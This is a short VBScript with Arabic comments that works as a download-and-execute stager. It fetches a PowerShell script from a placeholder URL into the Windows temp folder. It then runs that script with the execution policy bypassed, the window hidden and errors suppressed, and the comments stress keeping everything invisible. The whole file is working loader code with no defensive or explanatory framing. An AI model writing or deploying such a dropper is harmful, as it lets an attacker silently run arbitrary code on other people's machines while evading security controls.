' --- إعداد المتغيرات الرابط ومسار الحفظ ---
Dim fileURL, savePath
fileURL = "https://example.com"  ' استبدل هذا برابط سكربت الـ PowerShell الخاص بك
savePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\script.ps1" ' سيتم حفظه في مجلد الملفات المؤقتة Temp

' --- الخطوة 1: تحميل الملف في الخلفية عبر HTTP ---
On Error Resume Next
Dim xmlHttp, adodbStream
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")

xmlHttp.Open "GET", fileURL, False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    ' فتح ملف وحفظ البيانات الثنائية المستلمة فيه
    Set adodbStream = CreateObject("ADODB.Stream")
    adodbStream.Type = 1 ' Binary
    adodbStream.Open
    adodbStream.Write xmlHttp.ResponseBody
    adodbStream.SaveToFile savePath, 2 ' 2 تعني استبدال الملف إن كان موجوداً من قبل
    adodbStream.Close
    Set adodbStream = Nothing
End If
Set xmlHttp = Nothing
On Error GoTo 0

' --- الخطوة 2: تشغيل سكربت الـ PowerShell في الخلفية تماماً ---
Dim objShell, cmdCommand
Set objShell = CreateObject("WScript.Shell")

' إعداد أمر التشغيل مع تخطي سياسة الحماية (Bypass) وجعل النافذة مخفية
cmdCommand = "powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & savePath & """"

' معامل الرقم 0 في النهاية يضمن تشغيل الأمر بالخلفية وإخفاء نافذة الـ CMD/PowerShell تماماً
objShell.Run cmdCommand, 0, False

' تنظيف الذاكرة
Set objShell = Nothing
